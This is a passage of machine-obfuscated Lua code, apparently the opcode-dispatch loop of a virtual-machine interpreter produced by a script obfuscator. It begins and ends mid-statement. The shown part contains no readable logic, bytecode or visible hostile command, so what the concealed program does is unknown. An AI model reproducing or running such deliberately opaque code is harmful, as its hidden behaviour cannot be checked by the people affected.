w[y[469]]=h[y[345]];else if ba>12 then y=f[n];else n=n+1;end end else if ba<=14 then w[y[469]]=h[y[345]];else if ba<16 then n=n+1;else y=f[n];end end end else if ba<=19 then if ba<=17 then w[y[469]]=w[y[345]][w[y[491]]];else if ba>18 then y=f[n];else n=n+1;end end else if ba<=20 then bb=y[469]else if ba==21 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif z~=125 then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end else w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];if(w[y[469]]~=y[491])then n=n+1;else n=y[345];end;end;elseif z<=126 then w[y[469]]=#w[y[345]];elseif 127==z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]]+y[491];n=n+1;y=f[n];h[y[345]]=w[y[469]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;end;elseif 134>=z then if(z==131 or z<131)then if(z<129 or z==129)then local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if ba>2 then w[y[469]][y[345]]=w[y[491]];else y=f[n];end end else if ba<=5 then if 4==ba then n=n+1;else y=f[n];end else if ba~=7 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba>8 then w[y[469]]=h[y[345]];else y=f[n];end else if 10==ba then n=n+1;else y=f[n];end end else if ba<=13 then if 13~=ba then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if ba<=14 then y=f[n];else if 15==ba then if(w[y[469]]~=w[y[491]])then n=n+1;else n=y[345];end;else break end end end end end ba=ba+1 end elseif not(z~=130)then w[y[469]]=w[y[345]]/y[491];else local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[469]]=w[y[345]][y[491]];else if 1==ba then n=n+1;else y=f[n];end end else if ba<=4 then if 3==ba then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if ba~=6 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[469]][y[345]]=w[y[491]];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if 13>ba then n=y[345];else break end end end end ba=ba+1 end end;elseif(z<132 or z==132)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[469]]=w[y[345]][y[491]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5~=ba then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if ba<=6 then y=f[n];else if ba>7 then n=n+1;else w[y[469]]=w[y[345]][y[491]];end end end end else if ba<=13 then if ba<=10 then if ba==9 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[469]]=false;end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[469]else if ba~=18 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif z~=134 then local ba=w[y[491]];if ba then n=(n+1);else w[y[469]]=ba;n=y[345];end;else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba==3 then w[y[469]]=h[y[345]];else n=n+1;end end end else if ba<=6 then if 5<ba then w[y[469]]=h[y[345]];else y=f[n];end else if ba<=7 then n=n+1;else if 8<ba then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[469]]=w[y[345]][w[y[491]]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[469]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif 137>=z then if(z==135 or z<135)then w[y[469]]=false;n=n+1;elseif 136<z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[469]]=w[y[345]][y[491]];else bb=nil end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[469]]=y[345];end else if 6<ba then w[y[469]]=y[345];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if 11~=ba then w[y[469]]=y[345];else n=n+1;end end else if ba<=13 then if ba>12 then bb=y[469]else y=f[n];end else if 14<ba then break else w[bb]=w[bb](r(w,bb+1,y[345]))end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[469]]=j[y[345]];end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[469]]=w[y[345]][y[491]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba<16 then bd=y[469]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif 138>=z then w[y[469]][y[345]]=y[491];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];elseif z~=140 then local ba=y[469]local bb,bc=i(w[ba](r(w,ba+1,y[345])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]]*y[491];n=n+1;y=f[n];w[y[469]]=w[y[345]]+w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]]+w[y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif z<=164 then if 152>=z then if z<=146 then if 143>=z then if(z<=141)then local ba=w[y[469]]+y[491];w[y[469]]=ba;if(ba<=w[y[469]+1])then n=y[345];end;elseif(142<z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0<ba then w[y[469]]=w[y[345]][y[491]];else bb=nil end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if ba<=6 then y=f[n];else if ba~=8 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 9==ba then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if ba<=11 then n=n+1;else if ba<13 then y=f[n];else w[y[469]]=false;end end end else if ba<=15 then if ba>14 then y=f[n];else n=n+1;end else if ba<=16 then bb=y[469]else if ba<18 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 1<ba then n=n+1;else w[y[469]]=w[y[345]][y[491]];end end else if ba<=4 then if ba==3 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if 6>ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if ba==7 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if 9<ba then w[y[469]]=w[y[345]]*y[491];else y=f[n];end end else if ba<=12 then if 12>ba then n=n+1;else y=f[n];end else if ba<14 then w[y[469]]=w[y[345]]+w[y[491]];else n=n+1;end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if 15<ba then w[y[469]]=j[y[345]];else y=f[n];end else if ba==17 then n=n+1;else y=f[n];end end else if ba<=20 then if 20~=ba then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if 22>ba then y=f[n];else w[y[469]]=w[y[345]];end end end else if ba<=26 then if ba<=24 then if ba==23 then n=n+1;else y=f[n];end else if 25<ba then n=n+1;else w[y[469]]=w[y[345]]+w[y[491]];end end else if ba<=28 then if 27==ba then y=f[n];else bb=y[469]end else if ba~=30 then w[bb]=w[bb](r(w,bb+1,y[345]))else break end end end end end ba=ba+1 end end;elseif 144>=z then w[y[469]]=w[y[345]]%w[y[491]];elseif 145<z then w[y[469]]=false;else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](w[ba+1])end;elseif z<=149 then if 147>=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[469]]=h[y[345]];end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[469]]=h[y[345]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[469]]=w[y[345]][w[y[491]]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba==15 then bd=y[469]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z==148 then local ba=y[345];local bb=y[491];local ba=k(w,g,ba,bb);w[y[469]]=ba;else local ba;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif z<=150 then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end elseif 152~=z then local ba;w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()else local ba=y[469];do return w[ba](r(w,ba+1,y[345]))end;end;elseif z<=158 then if 155>=z then if z<=153 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[469]]=h[y[345]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[469]]=h[y[345]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[469]]=w[y[345]][w[y[491]]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[469]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z~=155 then for ba=y[469],y[345],1 do w[ba]=nil;end;else local ba=y[469]w[ba]=w[ba](r(w,ba+1,p))end;elseif z<=156 then local ba;w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()elseif 158>z then local ba;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else w[y[469]]=w[y[345]]%y[491];end;elseif 161>=z then if 159>=z then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()elseif 161~=z then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](w[ba+1])else local ba=y[469]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[491]do bc=bc+1;w[bd]=bb[bc];end end;elseif z<=162 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[469]]=j[y[345]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[469]]=w[y[345]][y[491]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[469]end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end elseif z<164 then local ba=y[469]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else do return w[y[469]]end end;elseif z<=176 then if z<=170 then if z<=167 then if z<=165 then w[y[469]]=w[y[345]]-w[y[491]];elseif z<167 then local ba;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif 168>=z then if(y[469]<w[y[491]])then n=n+1;else n=y[345];end;elseif z~=170 then local ba=y[469];local bb=w[ba];for bc=ba+1,y[345]do t(bb,w[bc])end;else local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end end;elseif 173>=z then if z<=171 then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end elseif z~=173 then local ba=w[y[491]];if not ba then n=n+1;else w[y[469]]=ba;n=y[345];end;else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];if(w[y[469]]~=y[491])then n=n+1;else n=y[345];end;end;elseif z<=174 then local ba=y[469]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[491]do bc=bc+1;w[bd]=bb[bc];end elseif z>175 then a(c,e);else local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];bc=y[345];bb=y[491];ba=k(w,g,bc,bb);w[y[469]]=ba;end;elseif 182>=z then if z<=179 then if z<=177 then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469];do return w[ba](r(w,ba+1,y[345]))end;n=n+1;y=f[n];ba=y[469];do return r(w,ba,p)end;n=n+1;y=f[n];n=y[345];elseif 179~=z then if(w[y[469]]<=w[y[491]])then n=y[345];else n=n+1;end;else local ba;w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()end;elseif z<=180 then w[y[469]]={r({},1,y[345])};elseif 182>z then w[y[469]]=w[y[345]]*y[491];else local ba=d[y[345]];local bb={};local bc={};for bd=1,y[491]do n=n+1;local be=f[n];if be[195]==239 then bc[bd-1]={w,be[345]};else bc[bd-1]={h,be[345]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(bd,bd)local bd=bc[bd];return bd[1][bd[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bd,bd,be)local bc=bc[bd]bc[1][bc[2]]=be;end;});w[y[469]]=b(ba,bb,j);end;elseif 185>=z then if(z<=183)then local ba=0 while true do if(ba==6 or ba<6)then if(ba<2 or ba==2)then if ba<=0 then w[y[469]]=w[y[345]][y[491]];else if not(1~=ba)then n=n+1;else y=f[n];end end else if ba<=4 then if 4>ba then w[y[469]]=w[y[345]][y[491]];else n=(n+1);end else if 5==ba then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if(ba<9 or ba==9)then if ba<=7 then n=n+1;else if(9>ba)then y=f[n];else w[y[469]][y[345]]=w[y[491]];end end else if(ba<=11)then if(10<ba)then y=f[n];else n=(n+1);end else if(13>ba)then n=y[345];else break end end end end ba=(ba+1)end elseif not(185==z)then local ba=w[y[491]];if not ba then n=n+1;else w[y[469]]=ba;n=y[345];end;else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[469]]=w[y[345]][y[491]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5~=ba then w[y[469]]=w[y[345]];else n=n+1;end else if 7>ba then y=f[n];else w[y[469]]=h[y[345]];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if ba==10 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[469]end else if 14==ba then w[bb]=w[bb](r(w,bb+1,y[345]))else break end end end end ba=ba+1 end end;elseif 186>=z then w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if not w[y[469]]then n=n+1;else n=y[345];end;elseif z~=188 then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](w[ba+1])end;elseif z<=282 then if 235>=z then if 211>=z then if 199>=z then if 193>=z then if z<=190 then if not(z==190)then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[469]]=w[y[345]][y[491]];else if 2~=ba then n=n+1;else y=f[n];end end else if ba<=4 then if ba<4 then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if 6>ba then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[469]][y[345]]=w[y[491]];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if 13~=ba then n=y[345];else break end end end end ba=ba+1 end else local ba=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then n=n+1;else a(c,e);end else if ba<3 then y=f[n];else w={};end end else if ba<=5 then if 5>ba then for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;else n=n+1;end else if ba<=6 then y=f[n];else if ba~=8 then w[y[469]]=y[345];else n=n+1;end end end end else if ba<=12 then if ba<=10 then if 9==ba then y=f[n];else w[y[469]]=j[y[345]];end else if ba~=12 then n=n+1;else y=f[n];end end else if ba<=14 then if 14~=ba then w[y[469]]=j[y[345]];else n=n+1;end else if ba<=15 then y=f[n];else if ba==16 then w[y[469]]=w[y[345]][y[491]];else break end end end end end ba=ba+1 end end;elseif z<=191 then local a,c,e=0 while true do if a<=24 then if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 2~=a then e=nil else w[y[469]]={};end end else if a<=3 then n=n+1;else if a==4 then y=f[n];else w[y[469]]=h[y[345]];end end end else if a<=8 then if a<=6 then n=n+1;else if 7<a then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end else if a<=9 then n=n+1;else if 11>a then y=f[n];else w[y[469]]=h[y[345]];end end end end else if a<=17 then if a<=14 then if a<=12 then n=n+1;else if 14>a then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end else if a<=15 then n=n+1;else if a==16 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end else if a<=20 then if a<=18 then n=n+1;else if a>19 then w[y[469]]={};else y=f[n];end end else if a<=22 then if 22>a then n=n+1;else y=f[n];end else if a>23 then n=n+1;else w[y[469]]={};end end end end end else if a<=37 then if a<=30 then if a<=27 then if a<=25 then y=f[n];else if 26<a then n=n+1;else w[y[469]]=h[y[345]];end end else if a<=28 then y=f[n];else if a<30 then w[y[469]][y[345]]=w[y[491]];else n=n+1;end end end else if a<=33 then if a<=31 then y=f[n];else if a>32 then n=n+1;else w[y[469]]=h[y[345]];end end else if a<=35 then if a<35 then y=f[n];else w[y[469]][y[345]]=w[y[491]];end else if 36<a then y=f[n];else n=n+1;end end end end else if a<=43 then if a<=40 then if a<=38 then w[y[469]][y[345]]=w[y[491]];else if 40>a then n=n+1;else y=f[n];end end else if a<=41 then w[y[469]]={r({},1,y[345])};else if a==42 then n=n+1;else y=f[n];end end end else if a<=46 then if a<=44 then w[y[469]]=w[y[345]];else if a<46 then n=n+1;else y=f[n];end end else if a<=48 then if 48~=a then e=y[469];else c=w[e];end else if 49<a then break else for ba=e+1,y[345]do t(c,w[ba])end;end end end end end end a=a+1 end elseif z<193 then local a;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=false;n=n+1;y=f[n];a=y[469]w[a](w[a+1])else local a;local c;w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]={r({},1,y[345])};n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];c=y[469];a=w[c];for e=c+1,y[345]do t(a,w[e])end;end;elseif 196>=z then if z<=194 then local a=y[469]local c,e=i(w[a](w[a+1]))p=e+a-1 local e=0;for ba=a,p do e=e+1;w[ba]=c[e];end;elseif z~=196 then local a;local c;local e;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];e=y[469]c={w[e](w[e+1])};a=0;for ba=e,y[491]do a=a+1;w[ba]=c[a];end else local a=y[469]w[a](r(w,a+1,p))end;elseif z<=197 then 